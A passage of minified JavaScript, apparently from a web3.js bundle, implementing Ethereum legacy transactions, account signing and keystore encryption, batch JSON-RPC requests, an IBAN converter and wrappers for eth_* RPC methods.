                }), n), this.common = this._validateTxV(this.v, n.common), this.gasPrice = Ae(Re(t.gasPrice === "" ? "0x" : t.gasPrice)), this.gasPrice * this.gasLimit > xl) {
                const o = this._errorMsg("gas limit * gasPrice cannot exceed MAX_INTEGER (2^256-1)");
                throw new Error(o)
            }
            this._validateCannotExceedMaxInteger({
                gasPrice: this.gasPrice
            }), ks._validateNotArray(t), this.common.gteHardfork("spuriousDragon") && (this.isSigned() ? Gy(this.v, this.common.chainId()) && this.activeCapabilities.push(jn.EIP155ReplayProtection) : this.activeCapabilities.push(jn.EIP155ReplayProtection)), ((r = n == null ? void 0 : n.freeze) !== null && r !== void 0 ? r : !0) && Object.freeze(this)
        }
        static fromTxData(t, n = {}) {
            return new Vr(t, n)
        }
        static fromSerializedTx(t, n = {}) {
            const r = zt.decode(t);
            if (!Array.isArray(r)) throw new Error("Invalid serialized tx input. Must be array");
            return this.fromValuesArray(r, n)
        }
        static fromValuesArray(t, n = {}) {
            if (t.length !== 6 && t.length !== 9) throw new Error("Invalid transaction. Only expecting 6 values (for unsigned tx) or 9 values (for signed tx).");
            const [r, i, o, s, a, l, u, c, d] = t;
            return P0({
                nonce: r,
                gasPrice: i,
                gasLimit: o,
                value: a,
                v: u,
                r: c,
                s: d
            }), new Vr({
                nonce: r,
                gasPrice: i,
                gasLimit: o,
                to: s,
                value: a,
                data: l,
                v: u,
                r: c,
                s: d
            }, n)
        }
        raw() {
            return [he(this.nonce), he(this.gasPrice), he(this.gasLimit), this.to !== void 0 ? this.to.buf : Uint8Array.from([]), he(this.value), this.data, this.v !== void 0 ? he(this.v) : Uint8Array.from([]), this.r !== void 0 ? he(this.r) : Uint8Array.from([]), this.s !== void 0 ? he(this.s) : Uint8Array.from([])]
        }
        serialize() {
            return zt.encode(this.raw())
        }
        _getMessageToSign() {
            const t = [he(this.nonce), he(this.gasPrice), he(this.gasLimit), this.to !== void 0 ? this.to.buf : Uint8Array.from([]), he(this.value), this.data];
            return this.supports(jn.EIP155ReplayProtection) && (t.push(Re(this.common.chainId())), t.push(Zu(Re(0))), t.push(Zu(Re(0)))), t
        }
        getMessageToSign(t = !0) {
            const n = this._getMessageToSign();
            return t ? bt(zt.encode(n)) : n
        }
        getDataFee() {
            return this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork() ? this.cache.dataFee.value : (Object.isFrozen(this) && (this.cache.dataFee = {
                value: super.getDataFee(),
                hardfork: this.common.hardfork()
            }), super.getDataFee())
        }
        getUpfrontCost() {
            return this.gasLimit * this.gasPrice + this.value
        }
        hash() {
            if (!this.isSigned()) {
                const t = this._errorMsg("Cannot call hash method if transaction is not signed");
                throw new Error(t)
            }
            return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = bt(zt.encode(this.raw()))), this.cache.hash) : bt(zt.encode(this.raw()))
        }
        getMessageToVerifySignature() {
            if (!this.isSigned()) {
                const n = this._errorMsg("This transaction is not signed");
                throw new Error(n)
            }
            const t = this._getMessageToSign();
            return bt(zt.encode(t))
        }
        getSenderPublicKey() {
            const t = this.getMessageToVerifySignature(),
                {
                    v: n,
                    r,
                    s: i
                } = this;
            this._validateHighS();
            try {
                return J0(t, n, he(r), he(i), this.supports(jn.EIP155ReplayProtection) ? this.common.chainId() : void 0)
            } catch {
                const s = this._errorMsg("Invalid Signature");
                throw new Error(s)
            }
        }
        _processSignature(t, n, r) {
            let i = t;
            this.supports(jn.EIP155ReplayProtection) && (i += this.common.chainId() * BigInt(2) + BigInt(8));
            const o = Object.assign(Object.assign({}, this.txOptions), {
                common: this.common
            });
            return Vr.fromTxData({
                nonce: this.nonce,
                gasPrice: this.gasPrice,
                gasLimit: this.gasLimit,
                to: this.to,
                value: this.value,
                data: this.data,
                v: i,
                r: Ae(n),
                s: Ae(r)
            }, o)
        }
        toJSON() {
            return {
                nonce: Ne(this.nonce),
                gasPrice: Ne(this.gasPrice),
                gasLimit: Ne(this.gasLimit),
                to: this.to !== void 0 ? this.to.toString() : void 0,
                value: Ne(this.value),
                data: ue(this.data),
                v: this.v !== void 0 ? Ne(this.v) : void 0,
                r: this.r !== void 0 ? Ne(this.r) : void 0,
                s: this.s !== void 0 ? Ne(this.s) : void 0
            }
        }
        _validateTxV(t, n) {
            let r;
            const i = t !== void 0 ? Number(t) : void 0;
            if (i !== void 0 && i < 37 && i !== 27 && i !== 28) throw new Error(`Legacy txs need either v = 27/28 or v >= 37 (EIP-155 replay protection), got v = ${i}`);
            if (i !== void 0 && i !== 0 && (!n || n.gteHardfork("spuriousDragon")) && i !== 27 && i !== 28)
                if (n) {
                    if (!Gy(BigInt(i), n.chainId())) throw new Error(`Incompatible EIP155-based V ${i} and chain id ${n.chainId()}. See the Common parameter of the Transaction constructor to set the chain id.`)
                } else {
                    let o;
                    (i - 35) % 2 === 0 ? o = 35 : o = 36, r = BigInt(i - o) / BigInt(2)
                }
            return this._getCommon(n, r)
        }
        errorStr() {
            let t = this._getSharedErrorPostfix();
            return t += ` gasPrice=${this.gasPrice}`, t
        }
        _errorMsg(t) {
            return `${t} (${this.errorStr()})`
        }
    }
    const lh = new Map;
    class po {
        constructor() {}
        static typeToInt(t) {
            return Number(Ae(Re(t)))
        }
        static registerTransactionType(t, n) {
            const r = po.typeToInt(t);
            lh.set(r, n)
        }
        static fromTxData(t, n = {}) {
            if (!("type" in t) || t.type === void 0) return Vr.fromTxData(t, n);
            const r = po.typeToInt(t.type);
            if (r === 0) return Vr.fromTxData(t, n);
            if (r === 1) return ji.fromTxData(t, n);
            if (r === 2) return Di.fromTxData(t, n);
            const i = lh.get(r);
            if (i != null && i.fromTxData) return i.fromTxData(t, n);
            throw new Error(`Tx instantiation with type ${r} not supported`)
        }
        static fromSerializedData(t, n = {}) {
            if (t[0] <= 127) switch (t[0]) {
                case 1:
                    return ji.fromSerializedTx(t, n);
                case 2:
                    return Di.fromSerializedTx(t, n);
                default:
                    {
                        const r = lh.get(Number(t[0]));
                        if (r != null && r.fromSerializedTx) return r.fromSerializedTx(t, n);
                        throw new Error(`TypedTransaction with ID ${t[0]} unknown`)
                    }
            } else return Vr.fromSerializedTx(t, n)
        }
        static fromBlockBodyData(t, n = {}) {
            if (vi(t)) return this.fromSerializedData(t, n);
            if (Array.isArray(t)) return Vr.fromValuesArray(t, n);
            throw new Error("Cannot decode transaction: unknown type input")
        }
    }
    var of = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const Us = (e, t) => {
            let n;
            if (!t && typeof e == "string" && ye(e) && e.length !== 66) throw new sy;
            try {
                n = vi(e) ? e : Zn(e)
            } catch {
                throw new A4
            }
            if (!t && n.byteLength !== 32) throw new sy;
            return n
        },
        eg = (e, t = !1) => {
            const n = ye(e) ? e : Pn(e),
                r = ke(n),
                i = ke(bE(`Ethereum Signed Message:
${r.byteLength}`)),
                o = t ? r : Tt(i, r);
            return Yt(o)
        },
        X8 = (e, t) => {
            const n = Us(t),
                r = Ir.sign(e.substring(2), n),
                i = r.toCompactRawBytes(),
                o = r.r.toString(16).padStart(64, "0"),
                s = r.s.toString(16).padStart(64, "0"),
                a = r.recovery + 27;
            return {
                messageHash: e,
                v: Ze(a),
                r: `0x${o}`,
                s: `0x${s}`,
                signature: `${ue(i)}${a.toString(16)}`
            }
        },
        bA = (e, t) => {
            const n = eg(e),
                {
                    messageHash: r,
                    v: i,
                    r: o,
                    s,
                    signature: a
                } = X8(n, t);
            return {
                message: e,
                messageHash: r,
                v: i,
                r: o,
                s,
                signature: a
            }
        },
        eB = (e, t) => of (void 0, void 0, void 0, function*() {
            const n = e.sign(ke(t));
            if (N(n.v) || N(n.r) || N(n.s)) throw new _p("Signer Error");
            const r = n.validate(!0);
            if (r.length > 0) {
                let s = "Signer Error ";
                for (const a of r) s += `${s} ${a}.`;
                throw new _p(s)
            }
            const i = ue(n.serialize()),
                o = Yt(i);
            return {
                messageHash: ue(n.getMessageToSign(!0)),
                v: `0x${n.v.toString(16)}`,
                r: `0x${n.r.toString(16).padStart(64,"0")}`,
                s: `0x${n.s.toString(16).padStart(64,"0")}`,
                rawTransaction: i,
                transactionHash: ue(o)
            }
        }),
        tB = e => {
            if (N(e)) throw new H4;
            const t = po.fromSerializedData(ke(e));
            return Xn(t.getSenderAddress().toString())
        },
        Up = (e, t, n, r, i) => {
            if (typeof e == "object") {
                const d = `${e.r}${e.s.slice(2)}${e.v.slice(2)}`;
                return Up(e.messageHash, d, n)
            }
            if (typeof t == "string" && typeof n == "string" && !N(r)) {
                const d = `${n}${r.slice(2)}${t.slice(2)}`;
                return Up(e, d, i)
            }
            if (N(t)) throw new _4("signature string undefined");
            const o = 130,
                s = n ? e : eg(e);
            let a = parseInt(t.substring(o), 16);
            a > 26 && (a -= 27);
            const l = Ir.Signature.fromCompact(t.slice(2, o)).addRecoveryBit(a).recoverPublicKey(s.replace("0x", "")).toRawBytes(!1),
                u = Yt(l.subarray(1));
            return Xn(`0x${u.slice(-40)}`)
        },
        sf = e => {
            const t = Us(e),
                n = Ir.getPublicKey(t, !1),
                i = Yt(n.slice(1)).slice(-40);
            return Xn(`0x${i}`)
        },
        nB = (e, t) => {
            const n = Us(e);
            return `0x${ue(Ir.getPublicKey(n,t)).slice(4)}`
        },
        xA = (e, t, n) => of (void 0, void 0, void 0, function*() {
            var r, i, o, s, a, l, u;
            const c = Us(e);
            let d;
            if (n != null && n.salt ? d = typeof n.salt == "string" ? ke(n.salt) : n.salt : d = yl(32), !(I0(t) || vi(t))) throw new T4;
            const f = typeof t == "string" ? ke(Pn(t)) : t;
            let h;
            if (n != null && n.iv) {
                if (h = typeof n.iv == "string" ? ke(n.iv) : n.iv, h.length !== 16) throw new I4
            } else h = yl(16);
            const v = (r = n == null ? void 0 : n.kdf) !== null && r !== void 0 ? r : "scrypt";
            let p, w;
            if (v === "pbkdf2") {
                if (w = {
                        dklen: (i = n == null ? void 0 : n.dklen) !== null && i !== void 0 ? i : 32,
                        salt: ue(d).replace("0x", ""),
                        c: (o = n == null ? void 0 : n.c) !== null && o !== void 0 ? o : 262144,
                        prf: "hmac-sha256"
                    }, w.c < 1e3) throw new C4;
                p = KE(f, d, w.c, w.dklen, "sha256")
            } else if (v === "scrypt") w = {
                n: (s = n == null ? void 0 : n.n) !== null && s !== void 0 ? s : 8192,
                r: (a = n == null ? void 0 : n.r) !== null && a !== void 0 ? a : 8,
                p: (l = n == null ? void 0 : n.p) !== null && l !== void 0 ? l : 1,
                dklen: (u = n == null ? void 0 : n.dklen) !== null && u !== void 0 ? u : 32,
                salt: ue(d).replace("0x", "")
            }, p = ZE(f, d, w.n, w.p, w.r, w.dklen);
            else throw new Lx;
            const m = yield z0(c, p.slice(0, 16), h, "aes-128-ctr"), g = ue(m).slice(2), y = Yt(Tt(p.slice(16, 32), m)).replace("0x", "");
            return {
                version: 3,
                id: D0(),
                address: sf(c).toLowerCase().replace("0x", ""),
                crypto: {
                    ciphertext: g,
                    cipherparams: {
                        iv: ue(h).replace("0x", "")
                    },
                    cipher: "aes-128-ctr",
                    kdf: v,
                    kdfparams: w,
                    mac: y
                }
            }
        }),
        tg = (e, t) => {
            const n = Us(e, t);
            return {
                address: sf(n),
                privateKey: ue(n),
                signTransaction: r => {
                    throw new _p("Do not have network access to sign the transaction")
                },
                sign: r => bA(typeof r == "string" ? r : JSON.stringify(r), n),
                encrypt: (r, i) => of (void 0, void 0, void 0, function*() {
                    return xA(n, r, i)
                })
            }
        },
        rB = () => {
            const e = Ir.utils.randomPrivateKey();
            return tg(`${ue(e)}`)
        },
        iB = (e, t, n) => of (void 0, void 0, void 0, function*() {
            const r = typeof e == "object" ? e : JSON.parse(n ? e.toLowerCase() : e);
            if (Y.validateJSONSchema(V6, r), r.version !== 3) throw new k4;
            const i = typeof t == "string" ? ke(Pn(t)) : t;
            Y.validate(["bytes"], [i]);
            let o;
            if (r.crypto.kdf === "scrypt") {
                const u = r.crypto.kdfparams,
                    c = typeof u.salt == "string" ? ke(u.salt) : u.salt;
                o = ZE(i, c, u.n, u.p, u.r, u.dklen)
            } else if (r.crypto.kdf === "pbkdf2") {
                const u = r.crypto.kdfparams,
                    c = typeof u.salt == "string" ? ke(u.salt) : u.salt;
                o = KE(i, c, u.c, u.dklen, "sha256")
            } else throw new Lx;
            const s = ke(r.crypto.ciphertext);
            if (Yt(Tt(o.slice(16, 32), s)).replace("0x", "") !== r.crypto.mac) throw new S4;
            const l = yield JN(ke(r.crypto.ciphertext), o.slice(0, 16), ke(r.crypto.cipherparams.iv));
            return tg(l)
        });
    var Vy = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const oB = 1e3;
    class sB {
        constructor(t) {
            this._requestManager = t, this._requests = new Map
        }
        get requests() {
            return [...this._requests.values()].map(t => t.payload)
        }
        add(t) {
            const n = uo(t),
                r = new Vu;
            return this._requests.set(n.id, {
                payload: n,
                promise: r
            }), r
        }
        execute(t) {
            var n;
            return Vy(this, void 0, void 0, function*() {
                if (this.requests.length === 0) return Promise.resolve([]);
                const r = new Vu({
                    timeout: (n = t == null ? void 0 : t.timeout) !== null && n !== void 0 ? n : oB,
                    eagerStart: !0,
                    timeoutMessage: "Batch request timeout"
                });
                return this._processBatchRequest(r).catch(i => r.reject(i)), r.catch(i => {
                    i instanceof Fx && this._abortAllRequests("Batch request timeout"), r.reject(i)
                }), r
            })
        }
        _processBatchRequest(t) {
            var n, r;
            return Vy(this, void 0, void 0, function*() {
                const i = yield this._requestManager.sendBatch([...this._requests.values()].map(a => a.payload));
                if (i.length !== this._requests.size) throw this._abortAllRequests("Invalid batch response"), new Dn(i, `Batch request size mismatch the results size. Requests: ${this._requests.size}, Responses: ${i.length}`);
                const o = this.requests.map(a => a.id).map(Number).sort((a, l) => a - l),
                    s = i.map(a => a.id).map(Number).sort((a, l) => a - l);
                if (JSON.stringify(o) !== JSON.stringify(s)) throw this._abortAllRequests("Invalid batch response"), new Dn(i, `Batch request mismatch the results. Requests: [${o.join()}], Responses: [${s.join()}]`);
                for (const a of i) ei(a) ? (n = this._requests.get(a.id)) === null || n === void 0 || n.promise.resolve(a.result) : ti(a) && ((r = this._requests.get(a.id)) === null || r === void 0 || r.promise.reject(a.error));
                t.resolve(i)
            })
        }
        _abortAllRequests(t) {
            for (const {
                    promise: n
                } of this._requests.values()) n.reject(new L4(t))
        }
    }
    var aB = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class Lt extends VN {
        constructor(t) {
            var n;
            if (super(), this.providers = Wi.providers, X(t) || typeof t == "string" && t.trim() !== "" || Wu(t)) {
                this._requestManager = new Wi(t), this._subscriptionManager = new qu(this._requestManager, {});
                return
            }
            const {
                config: r,
                provider: i,
                requestManager: o,
                subscriptionManager: s,
                registeredSubscriptions: a,
                accountProvider: l,
                wallet: u,
                requestManagerMiddleware: c
            } = t;
            this.setConfig(r ?? {}), this._requestManager = o ?? new Wi(i, (n = r == null ? void 0 : r.enableExperimentalFeatures) === null || n === void 0 ? void 0 : n.useSubscriptionWhenCheckingBlockTimeout, c), s ? this._subscriptionManager = s : this._subscriptionManager = new qu(this.requestManager, a ?? {}), l && (this._accountProvider = l), u && (this._wallet = u)
        }
        get requestManager() {
            return this._requestManager
        }
        get subscriptionManager() {
            return this._subscriptionManager
        }
        get wallet() {
            return this._wallet
        }
        get accountProvider() {
            return this._accountProvider
        }
        static fromContextObject(...t) {
            return new this(...t.reverse())
        }
        getContextObject() {
            var t;
            return {
                config: this.config,
                provider: this.provider,
                requestManager: this.requestManager,
                subscriptionManager: this.subscriptionManager,
                registeredSubscriptions: (t = this.subscriptionManager) === null || t === void 0 ? void 0 : t.registeredSubscriptions,
                providers: this.providers,
                wallet: this.wallet,
                accountProvider: this.accountProvider
            }
        }
        use(t, ...n) {
            const r = new t(...n, this.getContextObject());
            return this.on(fo.CONFIG_CHANGE, i => {
                r.setConfig({
                    [i.name]: i.newValue
                })
            }), this[t.name] = r, r
        }
        link(t) {
            this.setConfig(t.config), this._requestManager = t.requestManager, this.provider = t.provider, this._subscriptionManager = t.subscriptionManager, this._wallet = t.wallet, this._accountProvider = t._accountProvider, t.on(fo.CONFIG_CHANGE, n => {
                this.setConfig({
                    [n.name]: n.newValue
                })
            })
        }
        registerPlugin(t) {
            if (this[t.pluginNamespace] !== void 0) throw new F4(t.pluginNamespace);
            const n = {
                [t.pluginNamespace]: t
            };
            n[t.pluginNamespace].link(this), Object.assign(this, n)
        }
        get provider() {
            return this.currentProvider
        }
        set provider(t) {
            this.requestManager.setProvider(t)
        }
        get currentProvider() {
            return this.requestManager.provider
        }
        set currentProvider(t) {
            this.requestManager.setProvider(t)
        }
        get givenProvider() {
            return Lt.givenProvider
        }
        setProvider(t) {
            return this.provider = t, !0
        }
        setRequestManagerMiddleware(t) {
            this.requestManager.setMiddleware(t)
        }
        get BatchRequest() {
            return sB.bind(void 0, this._requestManager)
        }
        extend(t) {
            var n;
            return t.property && !this[t.property] && (this[t.property] = {}), (n = t.methods) === null || n === void 0 || n.forEach(r => {
                const i = (...o) => aB(this, void 0, void 0, function*() {
                    return this.requestManager.send({
                        method: r.call,
                        params: o
                    })
                });
                t.property ? this[t.property][r.name] = i : this[r.name] = i
            }), this
        }
    }
    Lt.providers = Wi.providers;
    class Ge {
        constructor(t) {
            if (this.toAddress = () => {
                    if (this.isDirect()) {
                        const n = this._iban.slice(4),
                            r = Ge._parseInt(n, 36),
                            i = gl(r, 40);
                        return Xn(i)
                    }
                    throw new Error("Iban is indirect and cannot be converted. Must be length of 34 or 35")
                }, Ge.isIndirect(t) || Ge.isDirect(t)) this._iban = t;
            else throw new Error("Invalid IBAN was provided")
        }
        static isDirect(t) {
            return t.length === 34 || t.length === 35
        }
        isDirect() {
            return Ge.isDirect(this._iban)
        }
        static isIndirect(t) {
            return t.length === 20
        }
        isIndirect() {
            return Ge.isIndirect(this._iban)
        }
        static isValid(t) {
            return /^XE[0-9]{2}(ETH[0-9A-Z]{13}|[0-9A-Z]{30,31})$/.test(t) && Ge._mod9710(Ge._iso13616Prepare(t)) === 1
        }
        isValid() {
            return Ge.isValid(this._iban)
        }
        static fromBban(t) {
            const n = "XE",
                i = `0${(98-this._mod9710(this._iso13616Prepare(`${n}00${t}`))).toString()}`.slice(-2);
            return new Ge(`${n}${i}${t}`)
        }
        static createIndirect(t) {
            return Ge.fromBban(`ETH${t.institution}${t.identifier}`)
        }
        static fromAddress(t) {
            if (!Zt(t)) throw new x0(t);
            const r = BigInt(zl(t)).toString(36),
                i = gl(r, 15);
            return Ge.fromBban(i.toUpperCase())
        }
        static toIban(t) {
            return Ge.fromAddress(t).toString()
        }
        client() {
            return this.isIndirect() ? this._iban.slice(11) : ""
        }
        checksum() {
            return this._iban.slice(2, 4)
        }
        institution() {
            return this.isIndirect() ? this._iban.slice(7, 11) : ""
        }
        toString() {
            return this._iban
        }
    }
    Ge._iso13616Prepare = e => {
        const r = e.toUpperCase();
        return `${r.slice(4)}${r.slice(0,4)}`.split("").map(o => {
            const s = o.charCodeAt(0);
            return s >= 65 && s <= 90 ? s - 65 + 10 : o
        }).join("")
    };
    Ge._parseInt = (e, t) => [...e].reduce((n, r) => BigInt(parseInt(r, t)) + BigInt(t) * n, BigInt(0));
    Ge._mod9710 = e => {
        let t = e,
            n;
        for (; t.length > 2;) n = t.slice(0, 9), t = `${(parseInt(n,10)%97).toString()}${t.slice(n.length)}`;
        return parseInt(t, 10) % 97
    };
    Ge.toAddress = e => new Ge(e).toAddress();
    var ch = function(e, t, n, r) {
            function i(o) {
                return o instanceof n ? o : new n(function(s) {
                    s(o)
                })
            }
            return new(n || (n = Promise))(function(o, s) {
                function a(c) {
                    try {
                        u(r.next(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function l(c) {
                    try {
                        u(r.throw(c))
                    } catch (d) {
                        s(d)
                    }
                }

                function u(c) {
                    c.done ? o(c.value) : i(c.value).then(a, l)
                }
                u((r = r.apply(e, t || [])).next())
            })
        },
        EA;
    class AA extends ef {
        constructor(t) {
            super(), this[EA] = "Promise", this._promise = new Promise(t)
        }
        then(t, n) {
            return ch(this, void 0, void 0, function*() {
                return this._promise.then(t, n)
            })
        } catch (t) {
            return ch(this, void 0, void 0, function*() {
                return this._promise.catch(t)
            })
        } finally(t) {
            return ch(this, void 0, void 0, function*() {
                return this._promise.finally(t)
            })
        }
        on(t, n) {
            return super.on(t, n), this
        }
        once(t, n) {
            return super.once(t, n), this
        }
    }
    EA = Symbol.toStringTag;
    (function(e, t) {
        if (e.setImmediate) return;
        var n = 1,
            r = {},
            i = !1,
            o = e.document,
            s;

        function a(g) {
            typeof g != "function" && (g = new Function("" + g));
            for (var y = new Array(arguments.length - 1), x = 0; x < y.length; x++) y[x] = arguments[x + 1];
            var E = {
                callback: g,
                args: y
            };
            return r[n] = E, s(n), n++
        }

        function l(g) {
            delete r[g]
        }

        function u(g) {
            var y = g.callback,
                x = g.args;
            switch (x.length) {
                case 0:
                    y();
                    break;
                case 1:
                    y(x[0]);
                    break;
                case 2:
                    y(x[0], x[1]);
                    break;
                case 3:
                    y(x[0], x[1], x[2]);
                    break;
                default:
                    y.apply(t, x);
                    break
            }
        }

        function c(g) {
            if (i) setTimeout(c, 0, g);
            else {
                var y = r[g];
                if (y) {
                    i = !0;
                    try {
                        u(y)
                    } finally {
                        l(g), i = !1
                    }
                }
            }
        }

        function d() {
            s = function(g) {
                process.nextTick(function() {
                    c(g)
                })
            }
        }

        function f() {
            if (e.postMessage && !e.importScripts) {
                var g = !0,
                    y = e.onmessage;
                return e.onmessage = function() {
                    g = !1
                }, e.postMessage("", "*"), e.onmessage = y, g
            }
        }

        function h() {
            var g = "setImmediate$" + Math.random() + "$",
                y = function(x) {
                    x.source === e && typeof x.data == "string" && x.data.indexOf(g) === 0 && c(+x.data.slice(g.length))
                };
            e.addEventListener ? e.addEventListener("message", y, !1) : e.attachEvent("onmessage", y), s = function(x) {
                e.postMessage(g + x, "*")
            }
        }

        function v() {
            var g = new MessageChannel;
            g.port1.onmessage = function(y) {
                var x = y.data;
                c(x)
            }, s = function(y) {
                g.port2.postMessage(y)
            }
        }

        function p() {
            var g = o.documentElement;
            s = function(y) {
                var x = o.createElement("script");
                x.onreadystatechange = function() {
                    c(y), x.onreadystatechange = null, g.removeChild(x), x = null
                }, g.appendChild(x)
            }
        }

        function w() {
            s = function(g) {
                setTimeout(c, 0, g)
            }
        }
        var m = Object.getPrototypeOf && Object.getPrototypeOf(e);
        m = m && m.setTimeout ? m : e, {}.toString.call(e.process) === "[object process]" ? d() : f() ? h() : e.MessageChannel ? v() : o && "onreadystatechange" in o.createElement("script") ? p() : w(), m.setImmediate = a, m.clearImmediate = l
    })(typeof self > "u" ? va : self);
    var re = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };

    function lB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_protocolVersion",
                params: []
            })
        })
    }

    function _A(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_syncing",
                params: []
            })
        })
    }

    function cB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_coinbase",
                params: []
            })
        })
    }

    function uB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_mining",
                params: []
            })
        })
    }

    function dB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_hashrate",
                params: []
            })
        })
    }

    function fB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_gasPrice",
                params: []
            })
        })
    }

    function hB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_maxPriorityFeePerGas",
                params: []
            })
        })
    }

    function pB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_accounts",
                params: []
            })
        })
    }

    function mB(e) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_blockNumber",
                params: []
            })
        })
    }

    function gB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["address", "blockNumberOrTag"], [t, n]), e.send({
                method: "eth_getBalance",
                params: [t, n]
            })
        })
    }

    function vB(e, t, n, r) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["address", "hex", "blockNumberOrTag"], [t, n, r]), e.send({
                method: "eth_getStorageAt",
                params: [t, n, r]
            })
        })
    }

    function yB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["address", "blockNumberOrTag"], [t, n]), e.send({
                method: "eth_getTransactionCount",
                params: [t, n]
            })
        })
    }

    function wB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["bytes32"], [t]), e.send({
                method: "eth_getBlockTransactionCountByHash",
                params: [t]
            })
        })
    }

    function bB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["blockNumberOrTag"], [t]), e.send({
                method: "eth_getBlockTransactionCountByNumber",
                params: [t]
            })
        })
    }

    function xB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["bytes32"], [t]), e.send({
                method: "eth_getUncleCountByBlockHash",
                params: [t]
            })
        })
    }

    function EB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["blockNumberOrTag"], [t]), e.send({
                method: "eth_getUncleCountByBlockNumber",
                params: [t]
            })
        })
    }

    function AB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["address", "blockNumberOrTag"], [t, n]), e.send({
                method: "eth_getCode",
                params: [t, n]
            })
        })
    }

    function _B(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["address", "hex"], [t, n]), e.send({
                method: "eth_sign",
                params: [t, n]
            })
        })
    }

    function SB(e, t) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_signTransaction",
                params: [t]
            })
        })
    }

    function kB(e, t) {
        return re(this, void 0, void 0, function*() {
            return e.send({
                method: "eth_sendTransaction",
                params: [t]
            })
        })
    }

    function SA(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["hex"], [t]), e.send({
                method: "eth_sendRawTransaction",
                params: [t]
            })
        })
    }

    function TB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["blockNumberOrTag"], [n]), e.send({
                method: "eth_call",
                params: [t, n]
            })
        })
    }

    function IB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["blockNumberOrTag"], [n]), e.send({
                method: "eth_estimateGas",
                params: [t, n]
            })
        })
    }

    function CB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["bytes32", "bool"], [t, n]), e.send({
                method: "eth_getBlockByHash",
                params: [t, n]
            })
        })
    }

    function kA(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["blockNumberOrTag", "bool"], [t, n]), e.send({
                method: "eth_getBlockByNumber",
                params: [t, n]
            })
        })
    }

    function PB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["bytes32"], [t]), e.send({
                method: "eth_getTransactionByHash",
                params: [t]
            })
        })
    }

    function RB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["bytes32", "hex"], [t, n]), e.send({
                method: "eth_getTransactionByBlockHashAndIndex",
                params: [t, n]
            })
        })
    }

    function NB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["blockNumberOrTag", "hex"], [t, n]), e.send({
                method: "eth_getTransactionByBlockNumberAndIndex",
                params: [t, n]
            })
        })
    }

    function BB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["bytes32"], [t]), e.send({
                method: "eth_getTransactionReceipt",
                params: [t]
            })
        })
    }

    function MB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["bytes32", "hex"], [t, n]), e.send({
                method: "eth_getUncleByBlockHashAndIndex",
                params: [t, n]
            })
        })
    }

    function OB(e, t, n) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["blockNumberOrTag", "hex"], [t, n]), e.send({
                method: "eth_getUncleByBlockNumberAndIndex",
                params: [t, n]
            })
        })
    }

    function LB(e, t) {
        return re(this, void 0, void 0, function*() {
            return Y.validate(["filter"], [t]), e.send({
                method: "eth_newFilter",
                params: [t]
            })
        })
    }

